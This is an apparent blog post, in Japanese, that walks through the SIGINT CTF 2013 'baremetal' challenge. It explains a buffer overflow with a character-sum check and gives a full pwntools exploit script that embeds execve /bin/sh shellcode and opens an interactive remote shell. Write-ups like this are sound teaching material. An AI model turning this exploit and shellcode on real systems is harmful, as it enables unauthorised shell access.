---
layout: post
redirect_from:
  - /writeup/ctf/2013/sigint-ctf-2013-baremetal/
  - /blog/2016/03/31/sigint-ctf-2013-baremetal/
date: 2016-03-31T04:41:15+09:00
tags: [ "ctf", "writeup", "pwn", "sigint-ctf", "bof" ]
"target_url": [ "http://shell-storm.org/repo/CTF/SIGINT-2013/pwning/baremetal-100/" ]
---

# SIGINT CTF 2013 baremetal

## 解法

``` sh
$ file baremetal
baremetal: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped

$ checksec --file baremetal
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   baremetal

$ ldd baremetal
    not a dynamic executable

$ ll baremetal
-rwxr-xr-x 1 user user 684 Jul  8  2013 baremetal
```

-   直接`int 0x80`する小さなバイナリ
-   入力を読み、この文字列がチェックを通過すれば、bss領域にあるコードを実行する

<!-- -->

-   入力にbofがあって、実行されるコードの先頭$1$byteを上書き可能
-   チェックは、各文字のascii codeの総和が0x1ee7であるかどうか、である
    -   入力が短すぎてもだめだが、これは容易に無視できる
    -   nullまでの総和であるので、bofすると考慮すべき文字が追加されるので注意
-   実行されるコードというのは`\x47\x47\xff\xe7` `inc edi; inc edi; jmp edi`
    -   bufferのaddressは`eax`に入っている
    -   `\x97` `xchg edi, eax`を使う
    -   以下を適当に叩いて探した どうせ高々$256$通りである

``` sh
$ echo -n $'\x97\x47\xff\xe7\0\0\0\0' > a && objdump -D a -b binary -mi386 -M intel
```

## 実装

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host')
parser.add_argument('port', type=int)
args = parser.parse_args()
context.log_level = 'debug'

read_len = 0x3d
funptr = "\x47\x47\xff\xe7"
cmp_sum = 0x1ee7

# http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = \
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" + \
    "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
xchg_edi_eax = "\x97"

payload = ["\xff", shellcode, xchg_edi_eax]
l = read_len - len(''.join(payload))
s = [1] * l
i = 0
measure = lambda: sum(map(ord,''.join(payload))) + sum(s) + sum(map(ord,funptr[1:]))
while measure() < cmp_sum:
    d = cmp_sum - measure()
    s[i] += min(255 - 1, d)
    i += 1
payload.insert(2, ''.join(map(chr,s)))
payload = ''.join(payload)

log.info(repr(payload))
log.info(str(sum(map(ord,payload))))

p = remote(args.host, args.port)
p.recvline()
p.send(payload)
time.sleep(0.2)
p.sendline('id')
p.interactive()
```
